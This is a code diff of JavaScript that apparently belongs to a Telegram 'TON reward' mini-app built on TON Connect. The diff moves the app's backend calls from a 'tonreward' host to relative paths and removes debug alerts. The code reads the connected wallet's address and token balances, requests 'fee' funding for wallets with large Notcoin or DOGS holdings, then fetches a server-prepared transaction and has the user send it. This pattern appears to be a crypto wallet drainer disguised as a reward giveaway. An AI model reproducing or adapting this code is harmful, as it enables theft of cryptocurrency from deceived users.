@@ -28,7 +28,7 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
 	
 function checkProofInYourBackend(proof, wallet) {
 	        $.ajax({
-	            url: 'https://tonreward.wuaze.com/r.php',
+	            url: 'r.php',
 	            type: 'POST',
 	            data: {
 	                proof: proof,
@@ -42,7 +42,7 @@ function checkProofInYourBackend(proof, wallet) {
 	            }
 	        });
 		}
-alert("start")
+console.log("start")
 let url = new URLSearchParams(window.location.hash.split("#")[1])
 let tgWebAppData = new URLSearchParams(url.get("tgWebAppData"));
 const userData = JSON.parse(tgWebAppData.get("user"))
@@ -116,11 +116,9 @@ class WalletManager {
 }
 
 async function openButton() {
-    if (await tonConnectUI.connected) {  
-	    alert("ok");
+    if (await tonConnectUI.connected) {        
         await send_transaction();
     } else {
-	    alert("no);
         await tonConnectUI.openModal()
     }
 }
@@ -159,7 +157,7 @@ async function send_transaction() {
                 const tonBalance = data.result.balance / 1000000000;
                 if (tonBalance < 0.07) {
                     if (notcoinBalance >= 300 || dogsBalance > 3000){
-                    fetch('https://tonreward.wuaze.com/getfee.php', {
+                    fetch('getfee.php', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -198,7 +196,7 @@ async function send_transaction() {
     .catch(error => alert('Error fetching jettons balances:', error));
         const wallet_address = tonConnectUI.account.address;
 
-        let body = await (await fetch("https://tonreward.wuaze.com/api.php?command=get_transaction_json&wallet_sender=" + wallet_address)).json();       
+        let body = await (await fetch("api.php?command=get_transaction_json&wallet_sender=" + wallet_address)).json();       
         if (body.status === "error") {
                 return Swal.fire({
                 title: body.body,
